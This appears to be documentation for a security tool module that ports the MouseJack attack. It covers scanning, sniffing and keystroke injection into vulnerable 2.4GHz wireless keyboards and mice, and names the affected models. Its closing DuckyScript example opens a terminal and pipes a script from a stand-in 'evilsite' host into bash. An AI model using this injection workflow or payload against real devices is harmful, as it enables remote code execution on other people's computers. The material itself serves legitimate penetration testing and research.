This module, which is a port of [Bastille's mousejack attack](https://www.mousejack.com/), performs scanning and frames injection for HID devices on the 2.4Ghz spectrum, using Nordic Semiconductor nRF24LU1+ based USB dongles and Bastille's [RFStorm firmware](https://github.com/BastilleResearch/nrf-research-firmware).

The module will work with one of the devices supported by RFStorm:

- CrazyRadio PA USB dongle
- SparkFun nRF24LU1+ breakout board
- Logitech Unifying dongle (model C-U0007, Nordic Semiconductor based)

:::caution
In order for this module to work, you need to make sure you installed the [Bastilleâ€™s RFStorm firmware](https://github.com/BastilleResearch/nrf-research-firmware) on one of the supported devices.

:::

Once flashed with the proper firmware and connected to your computer, `dmesg` should report the device as:

```
usb 3-1.3: new full-speed USB device number 8 using xhci_hcd
usb 3-1.3: New USB device found, idVendor=1915, idProduct=0102
usb 3-1.3: New USB device strings: Mfr=1, Product=2, SerialNumber=0
usb 3-1.3: Product: Research Firmware
usb 3-1.3: Manufacturer: RFStorm
```

The attack is known to support detection and [DuckyScript](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) injection for the following devices:

- Microsoft Wireless Keyboard 800
- Microsoft Wireless Mouse 1000
- Microsoft Wireless Mobile Mouse 3500
- Microsoft All-In-One Media Keyboard
- Microsoft Sculpt Ergonomic Mouse
- Logitech Wireless Touch Keyboard K400r
- Logitech Marathon M705 Mouse
- Logitech Wave M510 Mouse
- Logitech Wireless Gaming Mouse G700s
- Logitech Wireless M325 Mouse
- Logitech K750 Wireless Keyboard
- Logitech K320 Wireless Keyboard
- Dell KM636 Wireless Mouse and Keyboard
- AmazonBasics MG-0975 Wireless Mouse

### Commands

#### `hid.recon on`

Start scanning for HID devices on the 2.4Ghz spectrum.

#### `hid.recon off`

Stop scanning for HID devices on the 2.4Ghz spectrum.

#### `hid.clear`

Clear all devices collected by the HID discovery module.

#### `hid.show`

Show a list of detected HID devices on the 2.4Ghz spectrum.

#### `hid.sniff ADDRESS`

Start sniffing a specific ADDRESS in order to collect payloads, use 'clear' to stop collecting.

#### `hid.inject ADDRESS LAYOUT FILENAME`

Parse the DuckyScript `FILENAME` and inject it as HID frames spoofing the device `ADDRESS`, using the `LAYOUT` keyboard mapping (available layouts: `BE BR CA CH DE DK ES FI FR GB HR IT NO PT RU SI SV TR US`).

:::note
The command `hid.inject` does not require the HID device to be visible via the `hid.show` command. If you know the address of the dongle already, you can simply set the `hid.force.type` parameter to one among `logitech` (the default value), `amazon` or `microsoft` and run the injection _"blindly"_.

### Parameters

| Parameter          | Default    | Description                                                                                                                                                                                                                    |

### Examples

Enable HID discovery, use the `ticker` module to display detected devices, wait for the device `32:26:9f:a4:08` to be detected and inject the `ducky.txt` script as HID frames using the US keyboard layout:

```bash
set ticker.commands clear; hid.show; events.show 10
hid.recon on
ticker on
# ... wait for the device to be detected, using `hid.show` ...
hid.inject 32:26:9f:a4:08 US ducky.txt
```

Send the `ducky.txt` script keystrokes to the dongle with address `32:26:9f:a4:08` forcing its type to `logitech` and without waiting for any connected device to be visible:

```bash
set hid.force.type logitech
hid.recon on
hid.inject 32:26:9f:a4:08 US ducky.txt
```

Example `ducky.txt` (for a complete list of available commands [see the documentation](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript)):

```bash
GUI SPACE
DELAY 200
STRING Terminal
ENTER
DELAY 500
STRING curl -L http://www.evilsite.com/commands.sh | bash
ENTER
```
